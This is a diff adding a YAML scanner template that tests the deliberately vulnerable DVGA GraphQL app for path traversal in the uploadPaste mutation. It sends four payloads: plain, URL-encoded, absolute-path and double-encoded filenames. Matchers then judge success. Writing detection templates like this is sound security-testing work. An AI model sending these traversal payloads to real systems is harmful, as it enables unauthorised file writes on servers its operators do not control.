@@ -1,0 +1,87 @@
+id: api8-path-traversal-dvga
+info:
+  name: "DVGA - Path Traversal via uploadPaste"
+  category: "API8:2023 Security Misconfiguration"
+  severity: "HIGH"
+  author: "hadrian"
+  description: "Tests for path traversal vulnerabilities in DVGA's uploadPaste mutation. The filename parameter is not properly sanitized, allowing attackers to write files to arbitrary locations on the filesystem using directory traversal sequences."
+  tags: ["graphql", "dvga", "path-traversal", "file-upload"]
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: false
+
+role_selector:
+  attacker_permission_level: "all"
+  victim_permission_level: "all"
+
+graphql:
+  - query: |
+      mutation PathTraversalBasic {
+        uploadPaste(content: "malicious content", filename: "../../../tmp/evil.txt") {
+          result
+          filename
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["uploadPaste", "result"]
+        part: body
+
+  - query: |
+      mutation PathTraversalEncoded {
+        uploadPaste(content: "test payload", filename: "..%2f..%2f..%2ftmp%2ftest.txt") {
+          result
+          filename
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["data"]
+        part: body
+
+  - query: |
+      mutation PathTraversalAbsolute {
+        uploadPaste(content: "pwned", filename: "/tmp/pwned.txt") {
+          result
+          filename
+        }
+      }
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["uploadPaste"]
+        part: body
+
+  - query: |
+      mutation PathTraversalDoubleEncoded {
+        uploadPaste(content: "double encoded", filename: "..%252f..%252ftmp%252fmalicious.txt") {
+          result
+          filename
+        }
+      }
+    matchers:
+      - type: status
+        status: [200, 400]
+      - type: word
+        words: ["data", "errors"]
+        part: body
+        condition: or
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: 200
+    - type: body_field
+      body_field: "data.uploadPaste"
+      exists: true
+    - type: body_field
+      body_field: "data.uploadPaste.result"
+      exists: true
+  vulnerability_pattern: "dvga_path_traversal_uploadpaste"
